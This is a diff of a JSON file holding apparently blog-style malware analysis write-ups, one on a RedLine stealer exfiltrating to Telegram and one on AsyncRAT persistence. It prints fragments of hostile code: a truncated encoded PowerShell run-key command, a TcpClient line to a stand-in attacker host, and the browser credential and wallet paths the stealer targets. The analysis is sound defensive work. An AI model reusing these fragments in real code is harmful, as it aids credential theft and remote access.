@@ -1,36 +1,46 @@
 [
     {
-        "id": "emotet-sample-442",
-        "title": "Emotet Variant #442 Analysis",
-        "date": "2023-10-12",
+        "id": "redline-stealer-campaign",
+        "title": "RedLine Stealer: The Telegram Exfiltration",
+        "date": "2025-11-20",
         "tag": "MALWARE",
-        "summary": "Unpacking the loader and identifying new C2 obfuscation techniques.",
-        "intro": "Detailed static and dynamic analysis of a suspicious binary found in the finance department. The objective is to determine capabilities and IOCs.",
+        "summary": "Analysis of a .NET stealer exfiltrating credentials to Telegram. Deobfuscation of the XOR routines.",
+        "intro": "Specimen obtained from a 'shipping invoice' phishing campaign targeting HR departments. The initial payload was a highly obfuscated .NET binary that bypasses static signatures by using dynamic API resolution.",
         "steps": [
             {
-                "title": "01. Sample Acquisition",
-                "content": "The file was delivered via a phishing email disguised as an invoice. PE Studio indicates high entropy.",
-                "code": "File Type: PE32 executable (GUI) Intel 80386\nEntropy: 7.821 (Packed)\nImports: KERNEL32.dll (suspiciously low)"
+                "title": "01. Initial Access & Unpacking",
+                "content": "The sample 'Invoice_Scan_992.exe' is a 600MB padded binary (to evade sandbox size limits). Using dnSpy, we identified the entry point which immediately decrypts a second stage payload from the resource section using AES-256.",
+                "code": "// Decryption Routine Stub\npublic static byte[] Decrypt(byte[] input, string key) {\n    RijndaelManaged aes = new RijndaelManaged();\n    aes.Key = Encoding.UTF8.GetBytes(key);\n    aes.Mode = CipherMode.ECB;\n    // ... payload execution\n}"
             },
             {
-                "title": "02. Unpacking & Deobfuscation",
-                "content": "Loaded sample into x64dbg. Set breakpoints on VirtualAlloc. Upon execution, the malware allocated memory.",
-                "code": "bp VirtualAlloc\nrun\n# Wait for allocation\nfollow in dump"
+                "title": "02. Config Extraction",
+                "content": "The unpacked payload contained the C2 configuration encoded with Base64 + XOR. After writing a small Python decoder, we extracted the C2 IP and the Telegram Bot ID used for data exfiltration.",
+                "code": "C2 IP: 193.x.x.x:443\nBot Token: 5521992:AAH...\nChat ID: -100442..."
+            },
+            {
+                "title": "03. Data Theft Capabilities",
+                "content": "The malware specifically targets 'Login Data' and 'Cookies' files from Chrome, Edge, and Brave. It also scans for 'wallet.dat' files in AppData to steal crypto keys before self-deleting.",
+                "code": "Targeted Paths:\n%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\n%AppData%\\Exodus\\exodus.wallet"
             }
         ]
     },
     {
-        "id": "ransomware-artifacts",
-        "title": "Windows Server Ransomware Artifacts",
-        "date": "2023-09-01",
+        "id": "asyncrat-persistence",
+        "title": "AsyncRAT Persistence Hunting",
+        "date": "2025-10-05",
         "tag": "FORENSICS",
-        "summary": "Disk forensics breakdown identifying patient zero.",
-        "intro": "Investigating a compromised server to find the entry point.",
+        "summary": "Tracking down a fileless persistence mechanism involving Scheduled Tasks and PowerShell.",
+        "intro": "A client reported slow performance and random pop-ups. We identified a hidden Scheduled Task executing a base64 encoded PowerShell script every hour.",
         "steps": [
             {
-                "title": "01. MFT Analysis",
-                "content": "Parsed the Master File Table to find creation timestamps of encrypted files.",
-                "code": "MFTECmd.exe -f \"C:\\$MFT\" --csv \"c:\\temp\\out.csv\""
+                "title": "01. Registry Analysis",
+                "content": "Autoruns revealed a suspicious entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. The value was not a file path, but a script block invoking a hidden process.",
+                "code": "powershell.exe -WindowStyle Hidden -Enc JABuAGUAdwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0AC..."
+            },
+            {
+                "title": "02. Payload Decoding",
+                "content": "Decoding the base64 string revealed the AsyncRAT client connecting to a dynamic DNS domain. It had capabilities to record the screen and log keystrokes.",
+                "code": "$client = New-Object System.Net.Sockets.TcpClient('evil-domain.ddns.net', 8852)"
             }
         ]
     }
